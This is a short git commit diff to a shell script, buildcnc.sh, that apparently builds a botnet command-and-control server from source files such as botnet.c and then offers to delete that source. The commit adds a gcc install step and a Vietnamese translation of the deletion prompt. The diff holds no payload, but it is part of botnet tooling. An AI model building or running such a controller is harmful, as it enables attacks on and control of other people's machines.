c951105f02c1e1ff8291675f3a338099ecd25292
ThangMC2374 <119519174+ThangMC2374@users.noreply.github.com>
2025-04-27 22:58:54 +0700

    Update buildcnc.sh

--- buildcnc.sh
+++ buildcnc.sh
@@ -1,6 +1,7 @@
 #/bin/bash
 
 apt-get install screen -y
+apt-get install gcc -y
 
 cd cnc
 gcc -o server main.c login_utils.c checks.c logger.c user_handler.c command_handler.c botnet.c -pthread
@@ -13,7 +14,7 @@ chmod +x server
 
 echo "DONE, USAGE->: screen ./server <botport> <threads> <cncport>"
 
-read -p "delete cnc dir (recommended)? (y/n): " answer
+read -p "muốn xóa thư mục cnc không?/delete cnc dir (recommended)? (y/n): " answer
 if [ "$answer" == "y" ]; then
     rm -rf cnc
     echo "cnc dir deleted, Done!"
